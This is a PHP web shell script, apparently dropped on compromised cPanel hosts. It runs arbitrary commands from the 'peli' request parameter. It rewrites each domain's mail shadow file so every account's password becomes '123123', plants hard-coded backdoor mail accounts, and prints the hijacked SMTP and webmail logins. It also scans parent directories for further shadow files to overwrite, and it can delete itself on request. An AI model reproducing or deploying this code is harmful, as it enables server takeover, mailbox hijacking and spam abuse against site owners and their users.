<?php
set_time_limit(0);
ignore_user_abort(true);
set_time_limit(0);
ignore_user_abort(true);
if (isset($_REQUEST['peli'])) {
    $el = $_REQUEST['peli'];
    system($el);
    echo '<center><h1>404 Toolers</h1>';
    echo '<font color=#FFFFFF>[uname]' . php_uname() . '[/uname]';
    @ini_set('output_buffering', 0);
    @ini_set('display_errors', 0);
    set_time_limit(0);
    ini_set('memory_limit', '64M');
    header('Content-Type: text/html; charset=UTF-8');
    set_time_limit(0);
    ini_set('memory_limit', '64M');
    ini_set('max_execution_time', 0);
    $ips = getenv('REMOTE_ADDR');
    $wr = 'infos:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
hussam:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
info:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
manager:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
administrator:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
offical:$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::
';
    $hm = 'infos:x:534:532::/home/$user/mail/$t/infos:/home/$user
hussam:x:534:532::/home/$user/mail/$t/hussam:/home/$user
info:x:534:532::/home/$user/mail/$t/info:/home/$user
manager:x:534:532::/home/$user/mail/$t/manager:/home/$user
administrator:x:534:532::/home/$user/mail/$t/administrator:/home/$user
offical:x:534:532::/home/$user/mail/$t/offical:/home/$user
';
    $ports = array(25, 587, 465, 110, 995, 143, 993);
    $primary_port = '587';
    $user = get_current_user();
    $password = '123123';
    $pwd = crypt($password, '$6$123123$');
    $t = $_SERVER['SERVER_NAME'];
    $t = @str_replace("www.", "", $t);
    @$passwd = file_get_contents('/home/' . $user . '/etc/' . $t . '/shadow');
    $ex = explode("
", $passwd);
    @link('/home/' . $user . '/etc/' . $t . '/shadow', '/home/' . $user . '/etc/' . $t . '/shadow.123123.bak');
    @unlink('/home/' . $user . '/etc/' . $t . '/shadow');
    foreach ($ex as $ex) {
        $ex = explode(':', $ex);
        $e = $ex[0];
        if ($e) {
            $b = fopen('/home/' . $user . '/etc/' . $t . '/shadow', 'ab');
            fwrite($b, $e . ':' . $pwd . ':16249:::::' . "
");
            fclose($b);
            echo '<center><span style=\'color:#00ff00;\'>' . $t . '|587|' . $e . '@' . $t . '|' . $password . '<br>';
        }
    }
    $c = fopen('/home/' . $user . '/etc/' . $t . '/passwd', 'a+');
    fwrite($c, $hm);
    fclose($c);
    $f = fopen('/home/' . $user . '/etc/' . $t . '/shadow', 'a+');
    fwrite($f, $wr);
    fclose($f);
    $parm = 'https://' . $t . ':2096';
    $peli = 'D-nCtnVO%JNl';
    $kirim = '

       SMTP AUTO CREATE
       
' . $t . '|587|' . $e . '@' . $t . '|' . $password . '
--------------------------------------------
' . $parm . ' | infos@' . $t . ' | ' . $peli . '
' . $parm . ' | hussam@' . $t . ' | ' . $peli . '
' . $parm . ' | info@' . $t . ' | ' . $peli . '
' . $parm . ' | manager@' . $t . ' | ' . $peli . '
' . $parm . ' | administrator@' . $t . ' | ' . $peli . '
' . $parm . ' | offical@' . $t . ' | ' . $peli . '
';
    function http_get($url) {
        $im = curl_init($url);
        curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($im, CURLOPT_HEADER, 0);
        return curl_exec($im);
        curl_close($im);
    }
}
elseif (isset($_REQUEST['del'])) {
    unlink(basename($_SERVER['PHP_SELF']));
}
$pat=array("",'../','../../','../../../','../../../../','../../../../../','../../../../../../');
$pass='$1$c5WCj0vT$pW/B8Jo3SKkcDsD1WrJtP0:16249::::::';
foreach($pat as $pa){
if(file_exists("$pa/etc")){
$path="$pa/etc/";
$a=scandir($path);
foreach ($a as $b){
if(@!eregi('.php',$b) && @!eregi('.txt',$b) && @!eregi('.html',$b) && @!eregi('htaccess',$b) && @!eregi('.ftp',$b))
$file="$path/$b/shadow";
if(file_exists($file)){
$html=@file_get_contents($file);
$html1=@str_replace(array("\n","\r", "\r\n" ," "), "", $html);
$aa=@explode('::::::',$html1);
foreach($aa as $aaa){
if(!empty($aaa)){
$ab=@explode(":$",$aaa);
$abc=$ab[0];
echo "$b|".'587'."|$abc@$b|".'123123'."<br>";
$save=@fopen('456789123','ab');
@fwrite($save,"$abc:$pass\r\n");
}}
$html2=@file_get_contents('456789123');
$save1=@fopen($file,'w');
@fwrite($save1,$html2);
@unlink('456789123');
@unlink('456789123');
@unlink('456789123');
}}}}

?>
